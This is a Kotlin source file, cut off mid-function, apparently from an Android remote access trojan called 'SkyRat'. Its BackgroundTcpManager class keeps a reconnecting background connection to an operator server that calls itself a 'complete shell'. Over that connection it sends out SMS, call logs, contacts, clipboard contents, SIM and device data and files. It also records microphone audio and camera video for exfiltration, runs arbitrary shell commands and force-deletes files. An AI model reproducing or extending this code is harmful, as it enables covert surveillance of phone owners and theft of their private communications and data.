package com.techsky.skyrat

import android.Manifest
import android.app.ActivityManager
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import java.io.*
import java.net.*
import java.text.SimpleDateFormat
import java.util.*

class BackgroundTcpManager(private val context: Context) {

    companion object {
        private const val TAG = "BackgroundTcpManager"
        private const val MAX_RECONNECT_ATTEMPTS = 50
        private const val BASE_RECONNECT_DELAY = 5000L
        private const val MAX_FILE_SIZE = 50 * 1024 * 1024 // 50MB limit
        private const val CHUNK_SIZE = 8192 // ADD THIS LINE
    }

    private val connectionLock = Any()
    private val recordingLock = Any()


    @Volatile
    private var isReconnecting = false
    private var reconnectAttempts = 0
    private var currentSocket: Socket? = null
    private var connectionJob: Job? = null
    private lateinit var outputStream: OutputStream
    private var currentDirectory = Environment.getExternalStorageDirectory().absolutePath

    // Audio recording variables

    @Volatile
    private var isVideoRecording = false
    @Volatile
    private var videoFile: File? = null
    private var mediaRecorderVideo: MediaRecorder? = null
    private val videoRecordingLock = Any()

    @Volatile
    private var mediaRecorder: MediaRecorder? = null
    @Volatile
    private var audioFile: File? = null
    @Volatile
    private var isRecording = false

    fun startConnection() {
        cleanup()
        connectionJob = CoroutineScope(Dispatchers.IO).launch {
            execute(Config.IP, Config.PORT)
        }
    }

    private suspend fun execute(ip: String, port: String) {
        var socket: Socket? = null

        try {
            Log.d(TAG, "Starting background connection attempt to $ip:$port")

            if (!isNetworkAvailable()) {
                Log.d(TAG, "No network available, waiting...")
                delay(5000)
                return
            }

            var attempts = 0
            while (attempts < 5) {
                attempts++
                Log.d(TAG, "Connection attempt #$attempts to $ip:$port")

                socket = Socket()

                try {
                    socket.soTimeout = 30000
                    socket.keepAlive = true
                    socket.tcpNoDelay = true

                    socket.connect(InetSocketAddress(ip, port.toInt()), 10000)
                    Log.d(TAG, "Background socket connection successful!")
                    currentSocket = socket
                    reconnectAttempts = 0
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "Connection error on attempt #$attempts: ${e.message}")
                    socket?.close()
                    delay(2000)
                    continue
                }
            }

            if (socket?.isConnected == true) {
                Log.d(TAG, "Background connection established successfully after $attempts attempts")
                handleConnection(socket)
            } else {
                Log.e(TAG, "Failed to establish background connection after $attempts attempts")
                scheduleReconnect()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Critical background connection error: ${e.message}", e)
            scheduleReconnect()
        } finally {
            cleanup()
        }
    }

    private suspend fun handleConnection(socket: Socket) {
        try {
            Log.d(TAG, "Setting up background streams")
            outputStream = DataOutputStream(socket.getOutputStream())
            val inputReader = BufferedReader(InputStreamReader(socket.getInputStream()))

            val deviceModel = Build.MODEL
            val androidVersion = Build.VERSION.RELEASE
            val welcomeMessage = "Hello there, welcome to complete shell of $deviceModel (Android $androidVersion)\n"
            Log.d(TAG, "Sending background welcome message")

            withContext(Dispatchers.IO) {
                outputStream.write(welcomeMessage.toByteArray(Charsets.UTF_8))
                outputStream.flush()
            }

            var line: String?
            while (socket.isConnected && !socket.isClosed) {
                try {
                    line = withContext(Dispatchers.IO) {
                        inputReader.readLine()
                    }

                    if (line == null) {
                        Log.d(TAG, "Background connection closed by server")
                        break
                    }

                    Log.d(TAG, "Background received command: '$line'")
                    processBackgroundCommand(line.trim(), socket)

                } catch (e: SocketTimeoutException) {
                    Log.d(TAG, "Socket timeout, checking connection...")
                    if (!isSocketAlive(socket)) {
                        Log.d(TAG, "Socket is dead, breaking connection")
                        break
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Background command error: ${e.message}")
                    break
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error in background connection handler: ${e.message}", e)
        } finally {
            Log.d(TAG, "Background connection ended, scheduling reconnection")
            scheduleReconnect()
        }
    }
// COMPLETE FIXED processBackgroundCommand method - Replace in BackgroundTcpManager.kt

    private suspend fun processBackgroundCommand(command: String, socket: Socket) {
        try {
            val startTime = System.currentTimeMillis()
            Log.d(TAG, "Processing command: '$command' at $startTime")

            // Add small delay to ensure command is fully received
            delay(10)

            when {
                command == "deviceInfo" -> {
                    Log.d(TAG, "Executing: deviceInfo")
                    val deviceInfo = getDeviceInfo()
                    sendResponse(deviceInfo, socket)
                }

                command == "getIP" -> {
                    Log.d(TAG, "Executing: getIP")
                    val ipAddress = getDeviceIP()
                    sendResponse("Device IP: $ipAddress", socket)
                }

                command == "getMACAddress" -> {
                    Log.d(TAG, "Executing: getMACAddress")
                    val macAddress = getMACAddress()
                    sendResponse("MAC Address: $macAddress", socket)
                }

                command == "getSimDetails" -> {
                    Log.d(TAG, "Executing: getSimDetails")
                    val simDetails = getSimDetails()
                    sendResponse(simDetails, socket)
                }

                command == "sysinfo" -> {
                    Log.d(TAG, "Executing: sysinfo")
                    val sysInfo = getSystemInfo()
                    sendResponse(sysInfo, socket)
                }

                command == "getClipData" -> {
                    Log.d(TAG, "Executing: getClipData")
                    val clipData = getClipboardData()
                    sendResponse("Clipboard: $clipData", socket)
                }

                command.startsWith("getSMS") -> {
                    Log.d(TAG, "Executing: getSMS")
                    val smsType = command.substringAfter("getSMS").trim()
                    val smsData = getSMSData(smsType.ifEmpty { "inbox" })
                    sendResponse(smsData, socket)
                }

                command == "getCallLogs" -> {
                    Log.d(TAG, "Executing: getCallLogs")
                    val callLogs = getCallLogsData()
                    sendResponse(callLogs, socket)
                }

                command == "camList" -> {
                    Log.d(TAG, "Executing: camList")
                    val result = getCameraList()
                    sendResponse(result, socket)
                }

                command.startsWith("startVideo") -> {
                    Log.d(TAG, "Executing: startVideo")
                    val parts = command.split(" ")
                    val cameraId = if (parts.size > 1) {
                        parts[1].toIntOrNull() ?: 0
                    } else {
                        0
                    }
                    val result = startVideoRecording(cameraId)
                    sendResponse(result, socket)
                }

                command == "stopVideo" -> {
                    Log.d(TAG, "Executing: stopVideo")
                    val result = stopVideoRecording()
                    sendResponse(result, socket)
                }

                command == "startAudio" -> {
                    Log.d(TAG, "Executing: startAudio")
                    val result = startAudioRecording()
                    sendResponse(result, socket)
                }

                command == "stopAudio" -> {
                    Log.d(TAG, "Executing: stopAudio")
                    val result = stopAudioRecording()
                    sendResponse(result, socket)
                }

                command == "getContacts" -> {
                    Log.d(TAG, "Executing: getContacts")
                    val contacts = getContactsData()
                    sendResponse(contacts, socket)
                }

                command == "getApps" -> {
                    Log.d(TAG, "Executing: getApps")
                    val apps = getInstalledApps()
                    sendResponse(apps, socket)
                }

                command == "pwd" -> {
                    Log.d(TAG, "Executing: pwd")
                    sendResponse("Current directory: $currentDirectory", socket)
                }

                command.startsWith("cd") -> {
                    Log.d(TAG, "Executing: cd")
                    val newPath = command.substringAfter("cd").trim()
                    val result = changeDirectory(newPath)
                    sendResponse(result, socket)
                }

                command.startsWith("ls") -> {
                    Log.d(TAG, "Executing: ls")
                    val path = command.substringAfter("ls").trim().ifEmpty { currentDirectory }
                    val listing = listDirectory(path)
                    sendResponse(listing, socket)
                }

                command.startsWith("download") -> {
                    Log.d(TAG, "Executing: download")
                    val filePath = command.substringAfter("download").trim()
                    if (filePath.isEmpty()) {
                        sendResponse("ERROR: Usage: download <file_path>", socket)
                    } else {
                        downloadFile(filePath, socket)
                    }
                }

                command.startsWith("upload ") -> {
                    Log.d(TAG, "Executing: upload")
                    val result = handleUpload(command, socket)
                    sendResponse(result, socket)
                }

                command.startsWith("delete") -> {
                    Log.d(TAG, "Executing: delete")
                    val args = command.split(" ").drop(1)
                    when {
                        args.isEmpty() -> {
                            sendResponse("Usage: delete <file_or_directory>", socket)
                        }
                        args[0] == "-f" && args.size > 1 -> {
                            val path = args.drop(1).joinToString(" ")
                            val result = forceDeletePath(path)
                            sendResponse(result, socket)
                        }
                        else -> {
                            val path = args.joinToString(" ")
                            val result = deletePathSimple(path)
                            sendResponse(result, socket)
                        }
                    }
                }

                command.startsWith("mkdir") -> {
                    Log.d(TAG, "Executing: mkdir")
                    val dirPath = command.substringAfter("mkdir").trim()
                    val result = createDirectory(dirPath)
                    sendResponse(result, socket)
                }

                command == "ps" -> {
                    Log.d(TAG, "Executing: ps")
                    val processes = getRunningProcesses()
                    sendResponse(processes, socket)
                }

                command.startsWith("kill") -> {
                    Log.d(TAG, "Executing: kill")
                    val processName = command.substringAfter("kill").trim()
                    val result = killProcess(processName)
                    sendResponse(result, socket)
                }

                command == "netstat" -> {
                    Log.d(TAG, "Executing: netstat")
                    val networkInfo = getNetworkConnections()
                    sendResponse(networkInfo, socket)
                }

                command.startsWith("ping") -> {
                    Log.d(TAG, "Executing: ping")
                    val host = command.substringAfter("ping").trim()
                    val result = pingHost(host)
                    sendResponse(result, socket)
                }

                command == "getPhotos" -> {
                    Log.d(TAG, "Executing: getPhotos")
                    val photos = getPhotosInfo()
                    sendResponse(photos, socket)
                }

                command == "getAudio" -> {
                    Log.d(TAG, "Executing: getAudio")
                    val audio = getAudioInfo()
                    sendResponse(audio, socket)
                }

                command == "getVideos" -> {
                    Log.d(TAG, "Executing: getVideos")
                    val videos = getVideosInfo()
                    sendResponse(videos, socket)
                }

                command.startsWith("vibrate") -> {
                    Log.d(TAG, "Executing: vibrate")
                    val times = command.substringAfter("vibrate").trim().toIntOrNull() ?: 1
                    val result = vibrateDevice(times)
                    sendResponse(result, socket)
                }

                command.startsWith("setClip") -> {
                    Log.d(TAG, "Executing: setClip")
                    val text = command.substringAfter("setClip").trim()
                    val result = setClipboardData(text)
                    sendResponse(result, socket)
                }

                command.startsWith("shell") -> {
                    Log.d(TAG, "Executing: shell")
                    val shellCmd = command.substringAfter("shell").trim()
                    if (shellCmd.isEmpty()) {
                        sendResponse("Usage: shell <command>", socket)
                    } else {
                        val result = executeShellCommand(shellCmd)
                        sendResponse(result, socket)
                    }
                }

                command == "help" -> {
                    Log.d(TAG, "Executing: help")
                    sendResponse(getCompleteHelpText(), socket)
                }

                command == "clear" -> {
                    Log.d(TAG, "Executing: clear")
                    sendResponse("\n".repeat(50) + "Screen cleared", socket)
                }

                command == "exit" -> {
                    Log.d(TAG, "Executing: exit")
                    sendResponse("Background connection closing. Goodbye!", socket)
                    withContext(Dispatchers.IO) {
                        socket.close()
                    }
                    return
                }

                command.isEmpty() || command.isBlank() -> {
                    Log.d(TAG, "Ignoring empty command")
                    return // Don't send response for empty commands
                }

                else -> {
                    Log.d(TAG, "Unknown command: $command")
                    sendResponse("Unknown Command: '$command'\nType 'help' for available commands", socket)
                }
            }

            val endTime = System.currentTimeMillis()
            Log.d(TAG, "Command '$command' completed in ${endTime - startTime}ms")

        } catch (e: Exception) {
            Log.e(TAG, "Error processing command '$command': ${e.message}", e)
            sendResponse("Command execution error: ${e.message}", socket)
        }
    }
    private fun startAudioRecording(): String {
        return synchronized(recordingLock) {
            try {
                if (isRecording) {
                    return "Audio recording already in progress"
                }

                if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                    return "Permission denied: RECORD_AUDIO required"
                }

                // Create audio file in a better location
                val outputDir = File(context.getExternalFilesDir(null), "audio")
                if (!outputDir.exists()) outputDir.mkdirs()

                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                audioFile = File(outputDir, "audio_$timestamp.m4a")

                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    // IMPROVED: Better audio settings for compatibility
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setOutputFile(audioFile!!.absolutePath)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)

                    // ADDED: Better quality settings
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(128000) // 128 kbps
                    setAudioChannels(2) // Stereo

                    try {
                        prepare()
                        start()
                    } catch (e: Exception) {
                        Log.e(TAG, "MediaRecorder prepare/start failed: ${e.message}")
                        release()
                        throw e
                    }
                }

                isRecording = true
                Log.d(TAG, "Audio recording started: ${audioFile!!.absolutePath}")
                "Audio recording started successfully\nFile: ${audioFile!!.name}\nFormat: M4A/AAC"

            } catch (e: Exception) {
                Log.e(TAG, "Error starting audio recording: ${e.message}")
                isRecording = false
                mediaRecorder?.release()
                mediaRecorder = null
                audioFile?.delete()
                audioFile = null
                "Error starting audio recording: ${e.message}"
            }
        }
    }

    private fun stopAudioRecording(): String {
        return synchronized(recordingLock) {
            try {
                if (!isRecording || mediaRecorder == null) {
                    return "No active audio recording"
                }

                try {
                    mediaRecorder?.stop()
                } catch (e: Exception) {
                    Log.w(TAG, "Error stopping MediaRecorder: ${e.message}")
                }

                mediaRecorder?.release()
                mediaRecorder = null
                isRecording = false

                audioFile?.let { file ->
                    if (file.exists() && file.length() > 0) {
                        Log.d(TAG, "Audio file created: ${file.absolutePath}, size: ${file.length()}")

                        val fileData = file.readBytes()
                        val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)

                        // Keep the file for debugging (comment out to delete)
                        // file.delete()

                        val result = """
Audio recording stopped successfully!
File: ${file.name}
Size: ${formatFileSize(fileData.size.toLong())}
Format: M4A/AAC 44.1kHz Stereo
Path: ${file.absolutePath}

AUDIO_DATA:$encodedData
                    """.trimIndent()

                        Log.d(TAG, "Audio recording completed: ${file.name}, ${fileData.size} bytes")
                        return result

                    } else {
                        val error = "Audio recording stopped but no data captured\nFile exists: ${file.exists()}, Size: ${file.length()}"
                        Log.w(TAG, error)
                        return error
                    }
                } ?: run {
                    val error = "Audio recording stopped but file not found"
                    Log.w(TAG, error)
                    return error
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error stopping audio recording: ${e.message}")
                isRecording = false
                mediaRecorder?.release()
                mediaRecorder = null
                return "Error stopping audio recording: ${e.message}"
            }
        }
    }


// VIDEO RECORDING IMPLEMENTATION
// FIXED: Update startVideoRecording to TRY FIRST, handle errors when they occur

    private fun startVideoRecording(cameraId: Int = 0): String {
        return synchronized(videoRecordingLock) {
            try {
                Log.d(TAG, "Attempting video recording with camera $cameraId on Android ${Build.VERSION.RELEASE}")

                if (isVideoRecording) {
                    return "Video recording already in progress"
                }

                // Check permissions first (but don't check Android version)
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    return "Permission denied: CAMERA and RECORD_AUDIO required"
                }

                // Create video file
                val outputDir = File(context.getExternalFilesDir(null), "videos")
                if (!outputDir.exists()) outputDir.mkdirs()

                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                videoFile = File(outputDir, "video_$timestamp.mp4")

                Log.d(TAG, "Creating MediaRecorder for video...")

                // TRY to create MediaRecorder - let Android tell us if it fails
                mediaRecorderVideo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    try {
                        Log.d(TAG, "Configuring MediaRecorder...")

                        // TRY to configure video recording
                        setVideoSource(MediaRecorder.VideoSource.CAMERA)
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setOutputFile(videoFile!!.absolutePath)

                        // Video settings
                        setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                        setVideoSize(1280, 720) // 720p
                        setVideoFrameRate(30)
                        setVideoEncodingBitRate(2000000) // 2 Mbps

                        // Audio settings
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setAudioSamplingRate(44100)
                        setAudioEncodingBitRate(128000)

                        Log.d(TAG, "Preparing MediaRecorder...")
                        prepare()

                        Log.d(TAG, "Starting MediaRecorder...")
                        start()

                        Log.d(TAG, "MediaRecorder started successfully!")

                    } catch (e: Exception) {
                        Log.e(TAG, "MediaRecorder configuration failed: ${e.message}", e)
                        release()
                        throw e
                    }
                }

                isVideoRecording = true
                Log.d(TAG, "Video recording started successfully: ${videoFile!!.absolutePath}")

                return """
Video recording started successfully!
File: ${videoFile!!.name}
Format: MP4/H264 720p@30fps
Camera: $cameraId
Path: ${videoFile!!.absolutePath}
Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
Device: ${Build.MODEL}
            """.trimIndent()

            } catch (e: SecurityException) {
                Log.e(TAG, "Security exception during video recording: ${e.message}", e)
                cleanup()
                return "Video recording blocked by Android security: ${e.message}"

            } catch (e: RuntimeException) {
                Log.e(TAG, "Runtime exception during video recording: ${e.message}", e)
                cleanup()
                return "Video recording failed (camera may be in use): ${e.message}"

            } catch (e: Exception) {
                Log.e(TAG, "Unexpected error during video recording: ${e.message}", e)
                cleanup()
                return "Video recording failed: ${e.message}"
            }
        }
    }


    private fun stopVideoRecording(): String {
        return synchronized(videoRecordingLock) {
            try {
                if (!isVideoRecording || mediaRecorderVideo == null) {
                    return "No active video recording"
                }

                try {
                    mediaRecorderVideo?.stop()
                } catch (e: Exception) {
                    Log.w(TAG, "Error stopping video MediaRecorder: ${e.message}")
                }

                mediaRecorderVideo?.release()
                mediaRecorderVideo = null
                isVideoRecording = false

                videoFile?.let { file ->
                    if (file.exists() && file.length() > 0) {
                        Log.d(TAG, "Video file created: ${file.absolutePath}, size: ${file.length()}")

                        val fileData = file.readBytes()
                        val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)

                        // Keep the file for debugging (comment out to delete)
                        // file.delete()

                        val result = """
Video recording stopped successfully!
File: ${file.name}
Size: ${formatFileSize(fileData.size.toLong())}
Format: MP4/H264 720p
Path: ${file.absolutePath}

VIDEO_DATA:$encodedData
                    """.trimIndent()

                        Log.d(TAG, "Video recording completed: ${file.name}, ${fileData.size} bytes")
                        return result

                    } else {
                        val error = "Video recording stopped but no data captured\nFile exists: ${file.exists()}, Size: ${file.length()}"
                        Log.w(TAG, error)
                        return error
                    }
                } ?: run {
                    val error = "Video recording stopped but file not found"
                    Log.w(TAG, error)
                    return error
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error stopping video recording: ${e.message}")
                isVideoRecording = false
                mediaRecorderVideo?.release()
                mediaRecorderVideo = null
                return "Error stopping video recording: ${e.message}"
            }
        }
    }

    private fun getCameraList(): String {
        return try {
            val result = StringBuilder()
            result.append("=== AVAILABLE CAMERAS ===\n\n")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                // Modern Camera2 API
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
                val cameraIds = cameraManager.cameraIdList

                for (cameraId in cameraIds) {
                    val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                    val facing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)

                    val facingStr = when (facing) {
                        android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT -> "Front"
                        android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK -> "Back"
                        android.hardware.camera2.CameraCharacteristics.LENS_FACING_EXTERNAL -> "External"
                        else -> "Unknown"
                    }

                    result.append("Camera $cameraId: $facingStr\n")
                }
            } else {
                // Legacy Camera API
                @Suppress("DEPRECATION")
                val numberOfCameras = android.hardware.Camera.getNumberOfCameras()

                for (i in 0 until numberOfCameras) {
                    @Suppress("DEPRECATION")
                    val cameraInfo = android.hardware.Camera.CameraInfo()
                    @Suppress("DEPRECATION")
                    android.hardware.Camera.getCameraInfo(i, cameraInfo)

                    val facingStr = when (cameraInfo.facing) {
                        android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT -> "Front"
                        android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK -> "Back"
                        else -> "Unknown"
                    }

                    result.append("Camera $i: $facingStr\n")
                }
            }

            if (result.toString().contains("Camera")) {
                result.toString()
            } else {
                "No cameras found on device"
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error getting camera list: ${e.message}")
            "Error getting camera list: ${e.message}"
        }
    }
    // === VIBRATION IMPLEMENTATION ===

    private fun vibrateDevice(times: Int): String {
        return try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as android.os.VibratorManager
                vibratorManager.defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            }

            if (!vibrator.hasVibrator()) {
                return "Device does not have vibrator"
            }

            repeat(times) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(500)
                }
                Thread.sleep(800) // Pause between vibrations
            }

            "Device vibrated $times times"

        } catch (e: Exception) {
            Log.e(TAG, "Error vibrating device: ${e.message}")
            "Error vibrating device: ${e.message}"
        }
    }

    // === DEVICE IP IMPLEMENTATION ===

    private fun getDeviceIP(): String {
        return try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress) {
                        val sAddr = addr.hostAddress ?: continue
                        val isIPv4 = sAddr.indexOf(':') < 0
                        if (isIPv4) return sAddr
                    }
                }
            }
            "Unable to get IP"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // === MAC ADDRESS IMPLEMENTATION ===

    private fun getMACAddress(): String {
        return try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                if (intf.name.equals("wlan0", ignoreCase = true)) {
                    val mac = intf.hardwareAddress ?: continue
                    val buf = StringBuilder()
                    for (aMac in mac) {
                        buf.append(String.format("%02X:", aMac))
                    }
                    if (buf.isNotEmpty()) {
                        buf.deleteCharAt(buf.length - 1)
                    }
                    return buf.toString()
                }
            }
            "Unable to get MAC"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // === FILE OPERATIONS IMPLEMENTATION ===

    private fun changeDirectory(path: String): String {
        return try {
            val newDir = if (path.startsWith("/")) {
                File(path)
            } else {
                File(currentDirectory, path)
            }

            if (newDir.exists() && newDir.isDirectory) {
                currentDirectory = newDir.absolutePath
                "Changed directory to: $currentDirectory"
            } else {
                "Directory not found: ${newDir.absolutePath}"
            }
        } catch (e: Exception) {
            "Error changing directory: ${e.message}"
        }
    }

    private fun listDirectory(path: String): String {
        return try {
            val dir = File(path)
            if (!dir.exists()) {
                return "Directory not found: $path"
            }

            if (!dir.isDirectory) {
                return "Not a directory: $path"
            }

            val files = dir.listFiles()
            if (files == null) {
                return "Permission denied or directory is empty"
            }

            val result = StringBuilder()
            result.append("=== DIRECTORY LISTING: $path ===\n\n")

            // Sort files: directories first, then files
            val sortedFiles = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))

            for (file in sortedFiles) {
                val type = if (file.isDirectory) "DIR " else "FILE"
                val size = if (file.isFile) formatFileSize(file.length()) else "     "
                val modified = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))
                val permissions = getFilePermissions(file)

                result.append("$type $size $modified $permissions ${file.name}\n")
            }

            result.append("\nTotal: ${files.size} items")
            result.toString()

        } catch (e: Exception) {
            "Error listing directory: ${e.message}"
        }
    }

// SIMPLIFIED: Single-message download in BackgroundTcpManager.kt
private suspend fun downloadFile(filePath: String, socket: Socket) {
    try {
        Log.d(TAG, "Download request for: $filePath")

        // Handle relative vs absolute paths
        val file = if (filePath.startsWith("/")) {
            File(filePath)
        } else {
            File(currentDirectory, filePath)
        }

        Log.d(TAG, "Resolved file path: ${file.absolutePath}")

        if (!file.exists()) {
            sendResponse("ERROR: File not found: ${file.absolutePath}", socket)
            return
        }

        if (!file.isFile) {
            sendResponse("ERROR: Not a file: ${file.absolutePath}", socket)
            return
        }

        if (file.length() > MAX_FILE_SIZE) {
            sendResponse("ERROR: File too large (max ${MAX_FILE_SIZE / 1024 / 1024}MB): ${formatFileSize(file.length())}", socket)
            return
        }

        Log.d(TAG, "Reading file: ${file.name}, size: ${file.length()}")
        val fileData = file.readBytes()
        val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)

        // SIMPLIFIED: Send everything in one message with getFile prefix
        val fileName = file.nameWithoutExtension
        val fileExtension = file.extension.ifEmpty { "bin" }
        val downloadResponse = "getFile\n$fileName|_|$fileExtension|_|$encodedData"

        withContext(Dispatchers.IO) {
            outputStream.write(downloadResponse.toByteArray(Charsets.UTF_8))
            outputStream.write("END123\n".toByteArray(Charsets.UTF_8))
            outputStream.flush()
        }

        Log.d(TAG, "Download sent successfully: ${file.name}")

    } catch (e: Exception) {
        Log.e(TAG, "Error downloading file: ${e.message}", e)
        sendResponse("ERROR: Download failed: ${e.message}", socket)
    }
}

    private fun handleUpload(command: String, socket: Socket): String {
        return try {
            Log.d(TAG, "Processing upload: $command")

            // Parse: "upload filename base64data"
            val uploadData = command.removePrefix("upload ").trim()
            val spaceIndex = uploadData.indexOf(' ')

            if (spaceIndex == -1) return "ERROR: Usage: upload <filename> <base64data>"

            val filename = uploadData.substring(0, spaceIndex).trim()
            val base64Data = uploadData.substring(spaceIndex + 1).trim()

            if (filename.isEmpty()) return "ERROR: Filename cannot be empty"
            if (base64Data.isEmpty()) return "ERROR: No file data provided"

            val cleanData = base64Data.replace("\\s".toRegex(), "")
            val decodedBytes = Base64.decode(cleanData, Base64.DEFAULT)

            // Save to user-accessible Downloads/uploaded_files/
            val downloadDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "uploaded_files")
            if (!downloadDir.exists()) downloadDir.mkdirs()

            if (!downloadDir.canWrite()) return "ERROR: Cannot write to Downloads directory"

            // Avoid filename conflicts
            var finalFile = File(downloadDir, filename)
            var counter = 1
            while (finalFile.exists()) {
                val name = filename.substringBeforeLast('.', filename)
                val ext = if (filename.contains('.')) ".${filename.substringAfterLast('.')}" else ""
                finalFile = File(downloadDir, "${name}_$counter$ext")
                counter++
            }

            finalFile.writeBytes(decodedBytes)

            val result = "SUCCESS: Uploaded ${finalFile.name} (${formatBytes(decodedBytes.size)}) to ${finalFile.absolutePath}"
            Log.d(TAG, result)
            result

        } catch (e: IllegalArgumentException) {
            "ERROR: Invalid file data (not valid base64)"
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
            "ERROR: Upload failed - ${e.message}"
        }
    }
    private fun formatBytes(bytes: Int): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            else -> "${bytes / (1024 * 1024)} MB"
        }
    }

    private fun forceDeletePath(inputPath: String): String {
        return try {
            val file = if (inputPath.startsWith("/")) {
                File(inputPath)
            } else {
                File(currentDirectory, inputPath)
            }

            Log.d(TAG, "Force delete request for: ${file.absolutePath}")

            if (!file.exists()) {
                return "File/directory not found: ${file.absolutePath}"
            }

            // Try multiple deletion strategies
            val success = when {
                // Method 1: Try shell rm first
                tryShellDelete(file.absolutePath) -> true

                // Method 2: Try with different path format
                file.absolutePath.startsWith("/storage/emulated/0/") -> {
                    val sdcardPath = file.absolutePath.replace("/storage/emulated/0/", "/sdcard/")
                    tryShellDelete(sdcardPath)
                }

                // Method 3: Standard delete
                file.delete() -> true

                // Method 4: Try MediaStore deletion for media files
                tryMediaStoreDelete(file) -> true

                else -> false
            }

            if (success) {
                "SUCCESS: Force deleted '${file.name}'\nPath: ${file.absolutePath}"
            } else {
                "FAILED: Could not force delete ${file.absolutePath}\n" +
                        "File may be system-protected or require root access"
            }

        } catch (e: Exception) {
            "ERROR: Force delete failed - ${e.message}"
        }
    }

    private fun tryShellDelete(path: String): Boolean {
        return try {
            // Try different path variations
            val paths = listOf(
                path,
                path.replace("/storage/emulated/0/", "/sdcard/"),
                path.replace("/sdcard/", "/storage/emulated/0/")
            ).distinct()

            for (testPath in paths) {
                val process = Runtime.getRuntime().exec(arrayOf("rm", "-f", testPath))
                val exitCode = process.waitFor()
                if (exitCode == 0) {
                    Log.d(TAG, "Shell delete successful for path: $testPath")
                    return true
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "Shell delete failed: ${e.message}")
            false
        }
    }

    private fun tryMediaStoreDelete(file: File): Boolean {
        return try {
            // For media files, try using MediaStore
            if (file.name.matches(".*\\.(jpg|jpeg|png|gif|mp4|mp3|pdf)$".toRegex(RegexOption.IGNORE_CASE))) {
                val resolver = context.contentResolver
                val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI

                val selection = "${android.provider.MediaStore.Images.Media.DATA} = ?"
                val selectionArgs = arrayOf(file.absolutePath)

                val deleted = resolver.delete(uri, selection, selectionArgs)
                Log.d(TAG, "MediaStore delete result: $deleted rows")
                return deleted > 0
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "MediaStore delete failed: ${e.message}")
            false
        }
    }
    private fun deletePathSimple(inputPath: String): String {
        return try {
            // Handle path resolution
            val file = if (inputPath.startsWith("/")) {
                File(inputPath)
            } else {
                File(currentDirectory, inputPath)
